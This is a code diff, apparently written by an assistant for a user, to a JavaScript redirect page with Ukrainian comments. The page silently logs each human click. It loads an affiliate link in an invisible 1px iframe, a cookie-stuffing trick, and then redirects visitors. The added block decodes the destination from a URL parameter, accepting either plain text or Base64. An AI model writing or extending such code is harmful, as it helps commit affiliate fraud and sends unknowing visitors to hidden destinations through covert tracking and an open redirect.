@@ -283,21 +283,43 @@
 
                 // ШЛЄМО ТИХИЙ ЛОГ ДЛЯ КОЖНОГО КЛІКУ ЖИВОЇ ЛЮДИНИ
                 sendBotReport(userLabel, clickDetails);
-
+                
                 // Стандартний, перевірений редірект на товар
                 const cookieFrame = document.createElement('iframe');
                 cookieFrame.src = mainAffiliateLink;
                 cookieFrame.style.position = 'absolute'; cookieFrame.style.width = '1px'; cookieFrame.style.height = '1px'; cookieFrame.style.opacity = '0';
                 document.body.appendChild(cookieFrame);
-    
-                const finalAliLink = decodeURIComponent(targetCoinLink);
+                
+                // 🔥 ОНОВЛЕНИЙ БЛОК: Визначаємо фінальне посилання (замість одного твого рядка)
+                let finalAliLink = mainAffiliateLink;
+                if (targetCoinLink) {
+                    try {
+                        // 1. Декодуємо URL-символи (%3D -> =, %2F -> /)
+                        const decodedParam = decodeURIComponent(targetCoinLink);
+                        
+                        // 2. ПЕРЕВІРКА: якщо це старе посилання (відкритий текст)
+                        if (decodedParam.startsWith('http://') || decodedParam.startsWith('https://')) {
+                            finalAliLink = decodedParam;
+                            console.log("Зчитано старе посилання (відкритий текст)");
+                        } else {
+                            // 3. Якщо це новий Base64 шифр від шпигунів
+                            finalAliLink = atob(decodedParam);
+                            console.log("Зчитано нове посилання (розшифровано з Base64)");
+                        }
+                    } catch (e) {
+                        console.error("Помилка розшифрування посилання:", e);
+                        finalAliLink = mainAffiliateLink; // запасний аеродром
+                    }
+                }
+                
+                // ─── ДАЛІ ЗНОВУ ТВОЙ КОД БЕЗ ЖОДНИХ ЗМІН ───
                 const isAndroid = userAgent.includes('android');
                 const redirectTimeout = isAndroid ? 700 : 850;
-
+                
                 setTimeout(() => {
                     window.location.replace(finalAliLink);
                 }, redirectTimeout);
-    
+                
                 if (manualBtn) {
                     manualBtn.onclick = function() {
                         window.location.replace(finalAliLink);
